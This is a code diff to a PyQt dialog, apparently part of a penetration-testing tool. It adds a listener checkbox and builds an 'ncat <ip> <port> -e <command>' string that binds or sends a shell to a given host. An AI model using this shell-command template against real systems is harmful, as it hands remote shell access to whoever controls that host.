@@ -1245,6 +1245,13 @@ class Window(QMainWindow):
 
         layout = QVBoxLayout(dialog)
 
+        listener_layout = QHBoxLayout()
+        listener_label = QLabel("Listener Configuration:", dialog)
+        listener_yes = QCheckBox("Yes", dialog)
+        listener_layout.addWidget(listener_label)
+        listener_layout.addWidget(listener_yes)
+        layout.addLayout(listener_layout)
+
         ip_layout = QHBoxLayout()
         ip_label = QLabel("IP address:", dialog)
         ip_input = QLineEdit(dialog)
@@ -1274,10 +1281,11 @@ class Window(QMainWindow):
             ip = ip_input.text()
             port = port_input.text()
             command = shell_input.text()
-            
+            listener = "-l" if listener_yes.isChecked() else ""
+
             if not ip or not port:
                 QMessageBox.warning(dialog, "Input Error", "Please enter both IP address and port.")
-                return
+                return ""
 
             if command:
                 command = f"ncat {ip} {port} -e {command}"
